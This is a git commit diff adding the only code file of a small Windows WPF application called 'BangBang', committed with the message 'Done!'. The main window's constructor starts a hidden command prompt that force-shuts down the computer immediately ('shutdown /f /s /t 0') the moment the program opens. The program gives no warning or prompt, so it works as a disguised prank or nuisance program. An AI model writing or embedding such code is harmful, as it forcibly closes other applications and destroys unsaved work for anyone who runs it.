af634a5f3b831d43906837f0a80844333dc04ee0
Ilya N. Troychenkov <nitelab@mail.ru>
2018-09-19 09:19:30 +0300

    1.0.0.0
    Done!

---
+++ BangBang/MainWindow.xaml.cs
@@ -0,0 +1,21 @@
+﻿using System.Diagnostics;
+using System.Windows;
+
+namespace BangBang
+{
+    /// <summary>
+    /// Interaction logic for MainWindow.xaml
+    /// </summary>
+    public partial class MainWindow : Window
+    {
+        public MainWindow()
+        {
+            Process proc = new Process();
+            proc.StartInfo.FileName = "CMD.exe";
+            proc.StartInfo.Arguments = "/C shutdown /f /s /t 0";
+            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            proc.Start();
+            proc.WaitForExit();
+        }
+    }
+}
